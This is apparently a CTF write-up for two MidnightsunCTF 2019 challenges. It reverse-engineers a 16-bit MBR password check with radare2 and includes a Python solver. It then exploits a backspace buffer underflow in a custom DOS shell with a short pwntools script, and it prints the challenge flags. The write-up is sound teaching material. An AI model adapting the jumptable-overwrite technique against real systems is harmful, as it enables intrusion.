---
layout: post
category: Pwn
title: MidnightsunCTF 2019 qualifier
tags: 
    - kowu
---

# Stage1: Getting Past The Password Auth (hfs-mbr)

I used IDA in remote debug mode during the CTF, but it was somehow buggy and an overall painful experience for me.
Writeup using radare2 (even though, what a surprise, their 16 bit remote debugger seems to be currently kind of broken as well).

```
r2 -b16 dos.img
```

At offset `0000:0637` we find the main password loop of the program.

![m1](/assets/img/midnight_hfsdos1.png)

A single character is read, then a check is performed if the character is in the range of [a-z].
If it is, the char is converted into numbers ranging from 0 to 25. Afterwards the number is multiplied by 2 and serves as the index of a jumptable.
E.g. depending on the index a different function is called (jmp ax).

We can find the called functions below, starting at `0000:0662`. Luckily they were in oder, e.g. the first jumptable function belongs to the character 'a', the second to 'b', etc.

![m11](/assets/img/midnight_hfsdos11.png)

Most of the functions are dummy ones, effectively doing nothing. But some of them contain some checks, and depending on the outcome a different path is choosen.
The 0x7d9 path is the one we don't want to take. 0x7ce Is the way to go because it increments a counter for the amount of 'correct chars' (0x81bb), while the other one just increments the 'total chars' (0x81ba).
If after 9 input bytes both counters are equal, the password is correct.

So the objective is clear, we have to find the correct order of all jumptable functions.

Effectively all jumptable functions are doing the same, however they are more or less "obfuscated".
1. They take the number of 'total chars' and xor it with the current input character (`xor dl, byte [0x81ba]`).
2. They compare the resulting value with a fixed one, and take the good branch if correct


So I just deobfuscated all functions and noted the value they compare the input with. E.g. the function for char 'e' can be seen at `0000:0686`.
1. The first ax assignment is useless because of the follow up `xor ax, ax` (ax = 0)
2. 6 times adding 0x10 to ax is equal to ax = 0x60
3. Therefore 0x60 is subtracted from our xored charcode, and if the result is 2 we are good. This equation is fulfilled for xored charcode == 0x62.

I now did this for all functions and wrote a python script to resolve the correct order.

```python
chars = {'e': 0x62, 'j': 0x68, 'n': 0x68, 'o': 0x6e, 'p': 0x74, 'r': 0x7a, 's': 0x73, 'u': 0x76, 'w': 0x72}
pw = ''
n = 0
for _ in range(len(chars)):
    for c in chars:
        if (ord(c) ^ n) == chars[c]:
            pw += c
            n += 1
print(pw)
```
we get `sojupwner`, wich leads us to the first flag `midnight{w0ah_Sh!t_jU5t_g0t_REALmode}` and gives us access to stage2.
We are now dropped into a custom written "shell" (COMMAND.COM).

# Stage2: Pwning The Shell (hfs-dos)


First of all, I extracted the COMMAND.COM binary out of the raw image.
```
fdisk -l dos.img
```
```
Disk dos.img: 10 MiB, 10485760 bytes, 20480 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0x00000000

Device     Boot Start   End Sectors  Size Id Type
dos.img1   *       63 20159   20097  9.8M  1 FAT12
```
We can see that the FAT12 Filesystem starts at offset 63, and the sector size is 512. Therefore we setup the loop device for an offset of 63*512.
```
losetup /dev/loop0 dos.img -o 32256
```
Now we can mount and comfortably read the filesystem.
```
mount /dev/loop0 /mnt
```
Extract the COMMAND.COM and throw it into IDA or radare2.

The bug was pretty easy to spot as well, even found it bevore even looking at the disassembly. Deleting a character by using backspace had no lower bounds check.
With this we could owerwrite jumptable entries for console commands as they were placed directly above the input buffer.
By entering an overwritten command we now could now jump arbitrary.

![m2](/assets/img/midnight_hfsdos2.png)

An other thing I used to exploit is, that the shell reads and prints the flag for stage1 in the beginning.
And the Filename of Flag1 was right above us as well. Therefore my attack was as follows:

1. Overwrite the filename of the first flag (FLAG1) so it becomes FLAG2
2. Overwrite a jumptable entry of some console command with the address of the "print flag" function.
3. Trigger by executing the overwritten command ("pong" in my case)

```python
from pwn import *

# setup and stage1
r = remote('hfs-os-01.play.midnightsunctf.se', 31337)
r.recvuntil('MBR]>')
r.sendline('sojupwner')
r.send('ping')
r.recvuntil('PONG')

# actual exploit
r.send('\x7f' * 3 + '2\x0d')
r.send('\x7f' * 11 + struct.pack('<H', 0x14f) + '\x0d')
r.send('pong')
r.interactive()
```

we get `midnight{th4t_was_n0t_4_buG_1t_is_a_fEatuR3}`.